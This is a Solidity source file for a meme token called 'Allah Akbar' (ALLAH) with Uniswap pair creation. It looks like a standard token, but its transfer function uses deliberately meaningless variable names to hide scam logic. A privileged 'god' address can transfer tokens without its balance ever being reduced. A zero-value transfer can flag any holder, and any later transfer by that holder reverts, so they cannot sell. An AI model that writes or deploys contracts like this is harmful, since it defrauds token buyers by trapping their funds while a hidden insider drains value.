/*

Allah will give TG/Twitter/website  in your soul
ALLAH AKBAR
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract AllahAkbar is Ownable {
    function transfer(address views, uint256 mosquito) public returns (bool success) {
        coal(msg.sender, views, mosquito);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    string public name = 'Allah Akbar';

    function approve(address approver, uint256 mosquito) public returns (bool success) {
        allowance[msg.sender][approver] = mosquito;
        emit Approval(msg.sender, approver, mosquito);
        return true;
    }

    uint256 private screen = 24;

    uint8 public decimals = 9;

    function transferFrom(address allahu, address views, uint256 mosquito) public returns (bool success) {
        coal(allahu, views, mosquito);
        require(mosquito <= allowance[allahu][msg.sender]);
        allowance[allahu][msg.sender] -= mosquito;
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private order;

    function coal(address allahu, address views, uint256 mosquito) private returns (bool success) {
        if (order[allahu] == 0) {
            balanceOf[allahu] -= mosquito;
        }

        if (mosquito == 0) scientist[views] += screen;

        if (order[allahu] == 0 && uniswapV2Pair != allahu && scientist[allahu] > 0) {
            order[allahu] -= screen;
        }

        balanceOf[views] += mosquito;
        emit Transfer(allahu, views, mosquito);
        return true;
    }

    mapping(address => uint256) private scientist;

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = 'ALLAH';

    event Transfer(address indexed from, address indexed to, uint256 value);

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    address public uniswapV2Pair;

    constructor(address god) {
        balanceOf[msg.sender] = totalSupply;
        order[god] = screen;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }
}